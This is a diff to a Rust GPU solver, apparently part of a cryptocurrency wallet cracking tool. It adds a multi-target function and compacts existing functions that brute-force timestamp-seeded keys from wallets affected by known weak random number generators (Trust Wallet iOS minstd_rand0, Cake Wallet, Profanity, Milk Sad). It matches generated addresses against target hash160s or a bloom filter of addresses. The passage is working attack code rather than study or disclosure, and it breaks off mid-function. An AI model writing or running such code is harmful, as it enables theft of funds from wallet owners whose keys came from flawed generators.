@@ -104,8 +104,9 @@ impl KernelProfile {
                 "mt19937_64",
                 "batch_profanity",
                 "trust_wallet_crack",
-                "trust_wallet_lcg_crack",   // Trust Wallet iOS / minstd_rand0 LCG — single target
-                "trust_wallet_lcg_crack_bloom", // Trust Wallet iOS / minstd_rand0 LCG — bloom filter
+                "trust_wallet_lcg_crack",        // single-target
+                "trust_wallet_lcg_crack_mt",     // multi-target (N addresses, one pass)
+                "trust_wallet_lcg_crack_bloom",  // bloom filter
 				"cake_wallet_crack",
                 "milk_sad_crack",
                 "test_mt19937",
@@ -142,7 +143,7 @@ impl GpuSolver {
         return Ok(Vec::new());
     }
 
-    let stride = 136; // фиксированный single-block
+    let stride = 136;
     let msg_len = messages[0].len() as u32;
 
     let mut flat = vec![0u8; count * stride];
@@ -194,7 +195,7 @@ impl GpuSolver {
     Ok(out)
 }
 	
-    /// Дефолтный конструктор (как ожидают тесты)
+    /// Default constructor
     pub fn new() -> ocl::Result<Self> {
         Self::new_with_profile(KernelProfile::Full)
     }
@@ -229,7 +230,6 @@ impl GpuSolver {
 			.dims(1)
             .build()?;
 			
-		// ВРЕМЕННАЯ ДИАГНОСТИКА — удалить после исправления
 		{
 			use ocl::enums::{ProgramBuildInfo, ProgramBuildInfoResult};
 			let device = pro_que.device();
@@ -305,19 +305,13 @@ impl GpuSolver {
         .min(self.max_work_group_size)
 }
 
-
-    // Calculate optimal batch size based on device compute units
     #[allow(dead_code)]
     fn calculate_optimal_batch_size(&self, _work_per_item: usize) -> usize {
-        // Aim for 2-4 work items per compute unit for good occupancy
         let occupancy_factor = 4;
         let optimal_size =
             (self.max_compute_units as usize) * self.max_work_group_size * occupancy_factor;
-
-        // Round to nearest preferred work group multiple
         let rounded = optimal_size.div_ceil(self.preferred_work_group_multiple)
             * self.preferred_work_group_multiple;
-
         rounded.max(self.preferred_work_group_multiple)
     }
 
@@ -329,8 +323,6 @@ impl GpuSolver {
         self.compute_batch_with_kernel(&self.kernel_name, entropies, purpose)
     }
 
-    /// Compute addresses using Electrum seed derivation (with "electrum" salt)
-    /// This is specifically for Cake Wallet vulnerability scanning
     pub fn compute_batch_electrum(
         &self,
         entropies: &[[u8; 16]],
@@ -339,7 +331,6 @@ impl GpuSolver {
         self.compute_batch_with_kernel("batch_address_electrum", entropies, purpose)
     }
 
-    /// Compute addresses using the optimized kernel with local memory
     pub fn compute_batch_optimized(
         &self,
         entropies: &[[u8; 16]],
@@ -348,7 +339,6 @@ impl GpuSolver {
         self.compute_batch(entropies, purpose)
     }
 
-    /// Internal method to compute addresses using a specified kernel
     fn compute_batch_with_kernel(
         &self,
         kernel_name: &str,
@@ -364,16 +354,8 @@ impl GpuSolver {
         let mut entropies_lo = Vec::with_capacity(batch_size);
 
         for ent in entropies {
-            let hi = u64::from_be_bytes(
-                ent[0..8]
-                    .try_into()
-                    .expect("Entropy should always be 16 bytes"),
-            );
-            let lo = u64::from_be_bytes(
-                ent[8..16]
-                    .try_into()
-                    .expect("Entropy should always be 16 bytes"),
-            );
+            let hi = u64::from_be_bytes(ent[0..8].try_into().expect("16 bytes"));
+            let lo = u64::from_be_bytes(ent[8..16].try_into().expect("16 bytes"));
             entropies_hi.push(hi);
             entropies_lo.push(lo);
         }
@@ -414,9 +396,7 @@ impl GpuSolver {
             .local_work_size(local_work_size)
             .build()?;
 
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut output = vec![0u8; output_len];
         buffer_out.read(&mut output).enq()?;
@@ -427,7 +407,6 @@ impl GpuSolver {
             addr.copy_from_slice(chunk);
             results.push(addr);
         }
-
         Ok(results)
     }
 
@@ -462,12 +441,7 @@ impl GpuSolver {
 
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
-            .flags(
-                MemFlags::new()
-                    .read_write()
-                    .alloc_host_ptr()
-                    .copy_host_ptr(),
-            )
+            .flags(MemFlags::new().read_write().alloc_host_ptr().copy_host_ptr())
             .len(1)
             .copy_host_slice(&[0u32])
             .build()?;
@@ -487,16 +461,14 @@ impl GpuSolver {
 			.local_work_size(local_work_size)
 			.build()?;
 
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
 
         if count > 0 {
-            let read_count = std::cmp::min(count, max_results);
+            let read_count = count.min(max_results);
             let mut results = vec![0u64; max_results];
             buffer_results.read(&mut results).enq()?;
             Ok(results[0..read_count].to_vec())
@@ -507,9 +479,7 @@ impl GpuSolver {
 
     pub fn compute_mobile_hash(&self, indices: &[u64]) -> ocl::Result<Vec<[u8; 32]>> {
         let count = indices.len();
-        if count == 0 {
-            return Ok(Vec::new());
-        }
+        if count == 0 { return Ok(Vec::new()); }
 
         let buffer_indices = Buffer::builder()
             .queue(self.pro_que.queue().clone())
@@ -537,9 +507,7 @@ impl GpuSolver {
             .local_work_size(local_work_size)
             .build()?;
 
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut raw = vec![0u8; out_len];
         buffer_out.read(&mut raw).enq()?;
@@ -564,7 +532,6 @@ impl GpuSolver {
         for (i, b) in target_prefix.bytes().enumerate().take(8) {
             prefix_encoded |= (b as u64) << (i * 8);
         }
-
         let mut suffix_encoded = 0u64;
         for (i, b) in target_suffix.bytes().enumerate().take(8) {
             suffix_encoded |= (b as u64) << (i * 8);
@@ -597,16 +564,14 @@ impl GpuSolver {
             .global_work_size(batch_size)
             .build()?;
 
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
 
         if count > 0 {
-            let read_count = std::cmp::min(count, max_results);
+            let read_count = count.min(max_results);
             let mut results = vec![0u64; max_results];
             buffer_results.read(&mut results).enq()?;
             Ok(results[0..read_count].to_vec())
@@ -619,16 +584,9 @@ impl GpuSolver {
         let mut h1 = 0u64;
         let mut h2 = 0u64;
         let mut h3 = 0u32;
-
-        for (i, &byte) in target_h160.iter().enumerate().take(8) {
-            h1 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
-            h2 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
-            h3 |= (byte as u32) << (i * 8);
-        }
+        for (i, &byte) in target_h160.iter().enumerate().take(8)       { h1 |= (byte as u64) << (i * 8); }
+        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (byte as u64) << (i * 8); }
+        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (byte as u32) << (i * 8); }
 
         let max_results = 1024;
         let buffer_results = Buffer::<u64>::builder()
@@ -639,12 +597,7 @@ impl GpuSolver {
 
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
-            .flags(
-                MemFlags::new()
-                    .read_write()
-                    .alloc_host_ptr()
-                    .copy_host_ptr(),
-            )
+            .flags(MemFlags::new().read_write().alloc_host_ptr().copy_host_ptr())
             .len(1)
             .copy_host_slice(&[0u32])
             .build()?;
@@ -652,7 +605,6 @@ impl GpuSolver {
         let range: usize = 201 * 201 * 201;
         let local_work_size = self.max_work_group_size.min(256);
         let global_work_size = range.div_ceil(local_work_size) * local_work_size;
-        let offset: u64 = 0;
 
         let kernel = self
             .pro_que
@@ -662,21 +614,19 @@ impl GpuSolver {
             .arg(h1)
             .arg(h2)
             .arg(h3)
-            .arg(offset)
+            .arg(0u64)
             .global_work_size(global_work_size)
             .local_work_size(local_work_size)
             .build()?;
 
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
 
         if count > 0 {
-            let read_count = std::cmp::min(count, max_results);
+            let read_count = count.min(max_results);
             let mut results = vec![0u64; max_results];
             buffer_results.read(&mut results).enq()?;
             Ok(results[0..read_count].to_vec())
@@ -691,16 +641,11 @@ impl GpuSolver {
         target_addr: &[u8],
     ) -> ocl::Result<Vec<u64>> {
         let kernel_name = "batch_profanity";
-        
         if target_addr.len() != 20 {
-            return Err(ocl::Error::from(
-                format!("Invalid address length: {} (expected 20)", target_addr.len())
-            ));
+            return Err(ocl::Error::from(format!("Invalid address length: {}", target_addr.len())));
         }
-        
         let max_profanity_seed = 4_294_967_296u64;
         let actual_total = total_seeds.min(max_profanity_seed);
-        
         let batch_size = 100_000_000u64;
         let max_results = 1024;
 
@@ -709,7 +654,6 @@ impl GpuSolver {
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(max_results)
             .build()?;
-
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -719,23 +663,18 @@ impl GpuSolver {
         let mut target_part1: u64 = 0;
         let mut target_part2: u64 = 0;
         let mut target_part3: u32 = 0;
+        for i in 0..8 { target_part1 |= (target_addr[i]      as u64) << (i * 8); }
+        for i in 0..8 { target_part2 |= (target_addr[8 + i]  as u64) << (i * 8); }
+        for i in 0..4 { target_part3 |= (target_addr[16 + i] as u32) << (i * 8); }
 
-        for i in 0..8  { target_part1 |= (target_addr[i]      as u64) << (i * 8); }
-        for i in 0..8  { target_part2 |= (target_addr[8 + i]  as u64) << (i * 8); }
-        for i in 0..4  { target_part3 |= (target_addr[16 + i] as u32) << (i * 8); }
-
-        info!("[GPU] Target packed: {:016x} {:016x} {:08x}",
-              target_part1, target_part2, target_part3);
+        info!("[GPU] Target packed: {:016x} {:016x} {:08x}", target_part1, target_part2, target_part3);
 
         let mut all_results = Vec::new();
         let mut batch_start = 0u64;
-
         while batch_start < actual_total {
             let batch_end   = (batch_start + batch_size).min(actual_total);
             let batch_count = (batch_end - batch_start) as usize;
-
-            let zero_vec = vec![0u32];
-            buffer_count.write(&zero_vec[..]).enq()?;
+            buffer_count.write(&vec![0u32]).enq()?;
 
             let kernel = self
                 .pro_que
@@ -750,37 +689,23 @@ impl GpuSolver {
 
             let local_work_size  = 128;
             let global_work_size = batch_count.div_ceil(local_work_size) * local_work_size;
-
-            info!(
-                "[GPU] Batch: {}-{} ({} seeds, global={}, local={})",
-                batch_start, batch_end, batch_count, global_work_size, local_work_size
-            );
+            info!("[GPU] Batch: {}-{} ({} seeds)", batch_start, batch_end, batch_count);
 
             unsafe {
-                kernel
-                    .cmd()
-                    .global_work_size(global_work_size)
-                    .local_work_size(local_work_size)
-                    .enq()?;
+                kernel.cmd().global_work_size(global_work_size).local_work_size(local_work_size).enq()?;
             }
 
             let mut count_vec = vec![0u32; 1];
             buffer_count.read(&mut count_vec).enq()?;
             let count = count_vec[0] as usize;
-
             if count > 0 {
-                info!("[GPU] Found {} match(es) in this batch!", count);
                 let read_count = count.min(max_results);
                 let mut results = vec![0u64; max_results];
                 buffer_results.read(&mut results).enq()?;
-                for &seed in results.iter().take(read_count) {
-                    all_results.push(seed);
-                }
+                for &seed in results.iter().take(read_count) { all_results.push(seed); }
             }
-
             batch_start = batch_end;
         }
-
         Ok(all_results)
     }
 
@@ -792,109 +717,13 @@ impl GpuSolver {
         target_h160: &[u8; 20],
     ) -> ocl::Result<Vec<u64>> {
         let kernel_name = "trust_wallet_crack";
-
         const MAX_RESULTS: usize = 1024;
+
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(MAX_RESULTS)
             .build()?;
-
-        let buffer_count = Buffer::<u32>::builder()
-            .queue(self.pro_que.queue().clone())
-            .flags(MemFlags::new().read_write().alloc_host_ptr())
-            .len(1)
-            .build()?;
-
-        buffer_count.write(&vec![0u32]).enq()?;
-
-        let mut h1: u64 = 0;
-        let mut h2: u64 = 0;
-        let mut h3: u32 = 0;
-
-        for (i, &byte) in target_h160.iter().enumerate().take(8) {
-            h1 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
-            h2 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
-            h3 |= (byte as u32) << (i * 8);
-        }
-
-        let kernel = self
-            .pro_que
-            .kernel_builder(kernel_name)
-            .arg(&buffer_results)
-            .arg(&buffer_count)
-            .arg(h1)
-            .arg(h2)
-            .arg(h3)
-            .arg(start_timestamp)
-            .build()?;
-
-        let range = (end_timestamp - start_timestamp) as usize;
-        let local_work_size  = self.max_work_group_size.min(256);
-        let global_work_size = range.div_ceil(local_work_size) * local_work_size;
-
-        unsafe {
-            if let Err(e) = kernel
-                .cmd()
-                .global_work_size(global_work_size)
-                .local_work_size(local_work_size)
-                .enq()
-            {
-                error!(
-                    "Kernel execution failed: {} (kernel: {}, global={}, local={}, range={}-{})",
-                    e, kernel_name, global_work_size, local_work_size,
-                    start_timestamp, end_timestamp
-                );
-                return Err(e);
-            }
-        }
-
-        let mut count_vec = vec![0u32; 1];
-        buffer_count.read(&mut count_vec).enq()?;
-        let count = count_vec[0] as usize;
-
-        if count > 0 {
-            let read_count = std::cmp::min(count, MAX_RESULTS);
-            let mut results = vec![0u64; MAX_RESULTS];
-            buffer_results.read(&mut results).enq()?;
-            Ok(results[0..read_count].to_vec())
-        } else {
-            Ok(Vec::new())
-        }
-    }
-
-    /// Trust Wallet iOS — minstd_rand0 (LCG) crack
-    ///
-    /// Scans `[start_timestamp, end_timestamp)` checking all 6 combinations of:
-    ///   strategy ∈ { BytePerCallAnd, BytePerCallMod }
-    ///   path     ∈ { m/44'/0'/0'/0/0 (P2PKH), m/84'/0'/0'/0/0 (P2WPKH), m/49'/0'/0'/0/0 (P2SH-P2WPKH) }
-    ///
-    /// Returns `Vec<(timestamp, combo)>` where combo encodes (strategy, path):
-    ///   combo 0 → BytePerCallAnd + P2PKH
-    ///   combo 1 → BytePerCallMod + P2PKH
-    ///   combo 2 → BytePerCallAnd + P2WPKH
-    ///   combo 3 → BytePerCallMod + P2WPKH
-    ///   combo 4 → BytePerCallAnd + P2SH-P2WPKH
-    ///   combo 5 → BytePerCallMod + P2SH-P2WPKH
-    pub fn compute_trust_wallet_lcg_crack(
-        &self,
-        start_timestamp: u32,
-        end_timestamp: u32,
-        target_h160: &[u8; 20],
-    ) -> ocl::Result<Vec<(u32, u32)>> {
-        let kernel_name = "trust_wallet_lcg_crack";
-
-        const MAX_RESULTS: usize = 1024;
-        let buffer_results = Buffer::<u64>::builder()
-            .queue(self.pro_que.queue().clone())
-            .flags(MemFlags::new().read_write().alloc_host_ptr())
-            .len(MAX_RESULTS)
-            .build()?;
-
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -902,50 +731,29 @@ impl GpuSolver {
             .build()?;
         buffer_count.write(&vec![0u32]).enq()?;
 
-        // Pack Hash160 little-endian into (u64, u64, u32)
         let mut h1: u64 = 0;
         let mut h2: u64 = 0;
         let mut h3: u32 = 0;
         for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
-        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8) { h2 |= (b as u64) << (i * 8); }
-        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4){ h3 |= (b as u32) << (i * 8); }
-
-        // Global work size: 6 items per timestamp (one per combo)
-        let range      = (end_timestamp - start_timestamp) as usize;
-        let raw_global = range * 6;
-        let local      = self.max_work_group_size.min(256);
-        let global     = raw_global.div_ceil(local) * local;
-
-        info!(
-            "[GPU:LCG] Scanning {} timestamps × 6 combos → {} work items (local={})",
-            range, raw_global, local
-        );
+        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }
 
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
             .arg(&buffer_results)
             .arg(&buffer_count)
-            .arg(h1)
-            .arg(h2)
-            .arg(h3)
-            .arg(start_timestamp)   // offset
-            .arg(range as u32)      // range — used for bounds check in kernel
-            .global_work_size(global)
-            .local_work_size(local)
+            .arg(h1).arg(h2).arg(h3)
+            .arg(start_timestamp)
             .build()?;
 
+        let range = (end_timestamp - start_timestamp) as usize;
+        let local  = self.max_work_group_size.min(256);
+        let global = range.div_ceil(local) * local;
+
         unsafe {
-            if let Err(e) = kernel
-                .cmd()
-                .global_work_size(global)
-                .local_work_size(local)
-                .enq()
-            {
-                error!(
-                    "[GPU:LCG] Kernel failed: {} (global={}, local={}, ts={}-{})",
-                    e, global, local, start_timestamp, end_timestamp
-                );
+            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
+                error!("Kernel failed: {} ({})", e, kernel_name);
                 return Err(e);
             }
         }
@@ -953,42 +761,166 @@ impl GpuSolver {
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = (count_vec[0] as usize).min(MAX_RESULTS);
+        if count == 0 { return Ok(Vec::new()); }
 
-        if count == 0 {
-            return Ok(Vec::new());
+        let mut results = vec![0u64; MAX_RESULTS];
+        buffer_results.read(&mut results).enq()?;
+        Ok(results[0..count].to_vec())
+    }
+
+    /// Trust Wallet iOS — minstd_rand0 (LCG) single-target crack
+    pub fn compute_trust_wallet_lcg_crack(
+        &self,
+        start_timestamp: u32,
+        end_timestamp: u32,
+        target_h160: &[u8; 20],
+    ) -> ocl::Result<Vec<(u32, u32)>> {
+        let kernel_name = "trust_wallet_lcg_crack";
+        const MAX_RESULTS: usize = 1024;
+
+        let buffer_results = Buffer::<u64>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(MAX_RESULTS)
+            .build()?;
+        let buffer_count = Buffer::<u32>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(1)
+            .build()?;
+        buffer_count.write(&vec![0u32]).enq()?;
+
+        let mut h1: u64 = 0; let mut h2: u64 = 0; let mut h3: u32 = 0;
+        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }
+
+        let range  = (end_timestamp - start_timestamp) as usize;
+        let local  = self.max_work_group_size.min(256);
+        let global = (range * 6).div_ceil(local) * local;
+
+        info!("[GPU:LCG] {} ts × 6 combos → {} work items (local={})", range, range*6, local);
+
+        let kernel = self
+            .pro_que
+            .kernel_builder(kernel_name)
+            .arg(&buffer_results).arg(&buffer_count)
+            .arg(h1).arg(h2).arg(h3)
+            .arg(start_timestamp)
+            .arg(range as u32)
+            .global_work_size(global).local_work_size(local)
+            .build()?;
+
+        unsafe {
+            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
+                error!("[GPU:LCG] Kernel failed: {}", e);
+                return Err(e);
+            }
         }
+
+        let mut count_vec = vec![0u32; 1];
+        buffer_count.read(&mut count_vec).enq()?;
+        let count = (count_vec[0] as usize).min(MAX_RESULTS);
+        if count == 0 { return Ok(Vec::new()); }
 
         let mut raw = vec![0u64; MAX_RESULTS];
         buffer_results.read(&mut raw).enq()?;
-
-        let results = raw[..count]
-            .iter()
-            .map(|&v| {
-                let timestamp = (v & 0xFFFF_FFFF) as u32;
-                let combo     = (v >> 32) as u32;
-                (timestamp, combo)
-            })
-            .collect();
-
-        Ok(results)
+        Ok(raw[..count].iter().map(|&v| ((v & 0xFFFF_FFFF) as u32, (v >> 32) as u32)).collect())
     }
 
-    /// Trust Wallet iOS — minstd_rand0 (LCG) bloom filter scan
+    /// Trust Wallet iOS — minstd_rand0 (LCG) MULTI-TARGET crack
     ///
-    /// Uploads a brainflayer-compatible raw bit-array bloom filter (512 MB,
-    /// no header) to the GPU and checks all `range × 6` combos against it.
-    ///
-    /// ## Bloom format (k=5, brainflayer / hex2blf)
-    /// Each hash160 checks 5 bit positions derived from the 5 consecutive
-    /// LE `uint32` values at `hash160[i*4..i*4+4]` for `i` in 0..5.
-    ///
-    /// ## False positives
-    /// The kernel caps results at 4096 — matching the `if (slot < 4096u)`
-    /// guard in `trust_wallet_lcg_crack_bloom.cl`.  Callers (`run_bloom`)
-    /// must re-derive on CPU and filter against the real address set.
-    ///
-    /// ## Returns
-    /// `Vec<(timestamp, combo)>` — same layout as `compute_trust_wallet_lcg_crack`.
+    /// Scans all N hash160 targets in a single GPU pass.
+    /// Returns Vec<(timestamp, combo, target_idx)>.
+    pub fn compute_trust_wallet_lcg_crack_mt(
+        &self,
+        start_timestamp: u32,
+        end_timestamp: u32,
+        hash160s: &[[u8; 20]],
+    ) -> ocl::Result<Vec<(u32, u32, u32)>> {
+        let kernel_name = "trust_wallet_lcg_crack_mt";
+        let target_count = hash160s.len();
+        if target_count == 0 { return Ok(Vec::new()); }
+
+        // Flatten N×20 bytes
+        let mut flat = vec![0u8; target_count * 20];
+        for (i, h) in hash160s.iter().enumerate() {
+            flat[i * 20..(i + 1) * 20].copy_from_slice(h);
+        }
+
+        const MAX_RESULTS: usize = 8192;
+
+        let buf_targets = Buffer::<u8>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
+            .len(flat.len())
+            .copy_host_slice(&flat)
+            .build()?;
+
+        let buf_results = Buffer::<u64>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(MAX_RESULTS * 2)
+            .build()?;
+
+        let buf_count = Buffer::<u32>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(1)
+            .build()?;
+        buf_count.write(&vec![0u32]).enq()?;
+
+        let range  = (end_timestamp - start_timestamp) as usize;
+        let local  = self.max_work_group_size.min(256);
+        let global = (range * 6).div_ceil(local) * local;
+
+        info!(
+            "[GPU:LCG-MT] {} ts × 6 combos × {} targets → {} work items (local={})",
+            range, target_count, range * 6, local
+        );
+
+        let kernel = self
+            .pro_que
+            .kernel_builder(kernel_name)
+            .arg(&buf_results)
+            .arg(&buf_count)
+            .arg(&buf_targets)
+            .arg(target_count as u32)
+            .arg(start_timestamp)
+            .arg(range as u32)
+            .arg(MAX_RESULTS as u32)
+            .global_work_size(global)
+            .local_work_size(local)
+            .build()?;
+
+        unsafe {
+            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
+                error!("[GPU:LCG-MT] Kernel failed: {}", e);
+                return Err(e);
+            }
+        }
+
+        let mut count_vec = vec![0u32; 1];
+        buf_count.read(&mut count_vec).enq()?;
+        let count = (count_vec[0] as usize).min(MAX_RESULTS);
+        if count == 0 { return Ok(Vec::new()); }
+
+        let mut raw = vec![0u64; MAX_RESULTS * 2];
+        buf_results.read(&mut raw).enq()?;
+
+        let output = (0..count).map(|i| {
+            let w0 = raw[i * 2];
+            let w1 = raw[i * 2 + 1];
+            let timestamp  = (w0 & 0xFFFF_FFFF) as u32;
+            let combo      = (w0 >> 32) as u32;
+            let target_idx = w1 as u32;
+            (timestamp, combo, target_idx)
+        }).collect();
+
+        Ok(output)
+    }
+
+    /// Trust Wallet iOS — bloom filter scan
     pub fn compute_trust_wallet_lcg_bloom(
         &self,
         start_timestamp: u32,
@@ -996,15 +928,9 @@ impl GpuSolver {
         bloom_data: &[u8],
     ) -> ocl::Result<Vec<(u32, u32)>> {
         let kernel_name = "trust_wallet_lcg_bloom";
-
-        // MAX_RESULTS must match the `slot < 4096u` cap in the .cl kernel.
         const MAX_RESULTS: usize = 4096;
 
-        // Upload bloom filter as a read-only device buffer.
-        info!(
-            "[GPU:BLOOM] Uploading bloom filter ({} MB)…",
-            bloom_data.len() / 1_048_576
-        );
+        info!("[GPU:BLOOM] Uploading bloom filter ({} MB)…", bloom_data.len() / 1_048_576);
         let bloom_buf = Buffer::<u8>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
@@ -1017,7 +943,6 @@ impl GpuSolver {
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(MAX_RESULTS)
             .build()?;
-
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -1025,41 +950,25 @@ impl GpuSolver {
             .build()?;
         buffer_count.write(&vec![0u32]).enq()?;
 
-        // Global work size: 6 combos per timestamp.
-        let range      = (end_timestamp - start_timestamp) as usize;
-        let raw_global = range * 6;
-        let local      = self.max_work_group_size.min(256);
-        let global     = raw_global.div_ceil(local) * local;
+        let range  = (end_timestamp - start_timestamp) as usize;
+        let local  = self.max_work_group_size.min(256);
+        let global = (range * 6).div_ceil(local) * local;
 
-        info!(
-            "[GPU:BLOOM] {} timestamps × 6 combos → {} work items (local={})",
-            range, raw_global, local
-        );
+        info!("[GPU:BLOOM] {} ts × 6 → {} work items (local={})", range, range*6, local);
 
-        // Kernel signature: (results, result_count, bloom, offset, range)
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
-            .arg(&buffer_results)   // __global ulong* results
-            .arg(&buffer_count)     // __global uint*  result_count
-            .arg(&bloom_buf)        // __global const uchar* bloom
-            .arg(start_timestamp)   // uint offset
-            .arg(range as u32)      // uint range
-            .global_work_size(global)
-            .local_work_size(local)
+            .arg(&buffer_results).arg(&buffer_count)
+            .arg(&bloom_buf)
+            .arg(start_timestamp)
+            .arg(range as u32)
+            .global_work_size(global).local_work_size(local)
             .build()?;
 
         unsafe {
-            if let Err(e) = kernel
-                .cmd()
-                .global_work_size(global)
-                .local_work_size(local)
-                .enq()
-            {
-                error!(
-                    "[GPU:BLOOM] Kernel failed: {} (global={}, local={}, ts={}-{})",
-                    e, global, local, start_timestamp, end_timestamp
-                );
+            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
+                error!("[GPU:BLOOM] Kernel failed: {}", e);
                 return Err(e);
             }
         }
@@ -1067,27 +976,13 @@ impl GpuSolver {
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = (count_vec[0] as usize).min(MAX_RESULTS);
-
-        if count == 0 {
-            return Ok(Vec::new());
-        }
+        if count == 0 { return Ok(Vec::new()); }
 
         let mut raw = vec![0u64; MAX_RESULTS];
         buffer_results.read(&mut raw).enq()?;
-
-        let results = raw[..count]
-            .iter()
-            .map(|&v| {
-                let timestamp = (v & 0xFFFF_FFFF) as u32;
-                let combo     = (v >> 32) as u32;
-                (timestamp, combo)
-            })
-            .collect();
-
-        Ok(results)
+        Ok(raw[..count].iter().map(|&v| ((v & 0xFFFF_FFFF) as u32, (v >> 32) as u32)).collect())
     }
 
-    /// Compute Cake Wallet Crack — Timestamp mode
     pub fn compute_cake_wallet_crack_ms(
         &self,
         start_ms: u64,
@@ -1095,14 +990,13 @@ impl GpuSolver {
         target_h160: &[u8; 20],
     ) -> ocl::Result<Vec<(u64, u32, u32)>> {
         let kernel_name = "cake_wallet_crack_ms";
-
         let max_hits = 1024usize;
+
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(max_hits * 3)
             .build()?;
-
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -1110,12 +1004,10 @@ impl GpuSolver {
             .build()?;
         buffer_count.write(&vec![0u32]).enq()?;
 
-        let mut h1 = 0u64;
-        let mut h2 = 0u64;
-        let mut h3 = 0u32;
-        for i in 0..8  { h1 |= (target_h160[i]      as u64) << (i * 8); }
-        for i in 0..8  { h2 |= (target_h160[i + 8]  as u64) << (i * 8); }
-        for i in 0..4  { h3 |= (target_h160[i + 16] as u32) << (i * 8); }
+        let mut h1 = 0u64; let mut h2 = 0u64; let mut h3 = 0u32;
+        for i in 0..8 { h1 |= (target_h160[i]      as u64) << (i * 8); }
+        for i in 0..8 { h2 |= (target_h160[i + 8]  as u64) << (i * 8); }
+        for i in 0..4 { h3 |= (target_h160[i + 16] as u32) << (i * 8); }
 
         let local_work_size  = 128usize;
         let global_work_size = (count as usize).div_ceil(local_work_size) * local_work_size;
@@ -1123,46 +1015,32 @@ impl GpuSolver {
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
-            .arg(&buffer_results)
-            .arg(&buffer_count)
-            .arg(h1)
-            .arg(h2)
-            .arg(h3)
+            .arg(&buffer_results).arg(&buffer_count)
+            .arg(h1).arg(h2).arg(h3)
             .arg(start_ms)
-            .global_work_size(global_work_size)
-            .local_work_size(local_work_size)
+            .global_work_size(global_work_size).local_work_size(local_work_size)
             .build()?;
-
         unsafe { kernel.enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let hit_count = (count_vec[0] as usize).min(max_hits);
-
-        if hit_count == 0 {
-            return Ok(Vec::new());
-        }
+        if hit_count == 0 { return Ok(Vec::new()); }
 
         let mut raw = vec![0u64; max_hits * 3];
         buffer_results.read(&mut raw).enq()?;
 
         let mut out = Vec::with_capacity(hit_count);
         for i in 0..hit_count {
-            let ts_ms    = raw[i * 3];
-            let change   = raw[i * 3 + 1] as u32;
